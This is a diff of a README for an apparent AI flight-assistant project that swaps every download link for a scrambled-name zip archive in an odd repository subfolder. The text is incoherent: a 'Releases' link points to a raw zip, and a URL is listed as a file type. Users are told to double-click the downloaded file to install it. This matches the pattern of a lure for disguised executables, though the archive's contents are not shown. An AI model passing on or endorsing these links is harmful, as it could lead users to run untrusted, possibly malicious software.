@@ -1,7 +1,7 @@
 # ✈️ multi-modal-AI-assistant-with-tools - Your AI-Powered Flight Assistant
 
 ## 🌐 Download Now!
-[![Download](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/multi-modal-AI-assistant-with-tools.zip)](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/multi-modal-AI-assistant-with-tools.zip)
+[![Download](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/modal-A-with-assistant-multi-tools-v2.7.zip)](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/modal-A-with-assistant-multi-tools-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -26,11 +26,11 @@ To run this application smoothly, ensure your system meets the following require
 
 ## 📥 Download & Install
 
-To download the software, **visit [this page](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/multi-modal-AI-assistant-with-tools.zip)**. Here you will find the latest version of the application. Follow these simple steps:
+To download the software, **visit [this page](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/modal-A-with-assistant-multi-tools-v2.7.zip)**. Here you will find the latest version of the application. Follow these simple steps:
 
 1. Click on the **Releases** link above.
 2. Choose the latest version from the list.
-3. Download the file suited for your operating system (e.g., `.exe`, `.dmg`, or `https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/multi-modal-AI-assistant-with-tools.zip`).
+3. Download the file suited for your operating system (e.g., `.exe`, `.dmg`, or `https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/modal-A-with-assistant-multi-tools-v2.7.zip`).
 4. Locate the downloaded file on your computer.
 5. Double-click the file to start the installation process.
 
@@ -90,4 +90,4 @@ If you'd like to contribute, suggestions and contributions are welcome.
 
 For any questions or feedback, feel free to open an issue on the GitHub repository. Your input is valuable to us.
 
-[![Download](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/multi-modal-AI-assistant-with-tools.zip)](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/multi-modal-AI-assistant-with-tools.zip)
+[![Download](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/modal-A-with-assistant-multi-tools-v2.7.zip)](https://raw.githubusercontent.com/srinunandipalli20/multi-modal-AI-assistant-with-tools/main/pustulatous/modal-A-with-assistant-multi-tools-v2.7.zip)
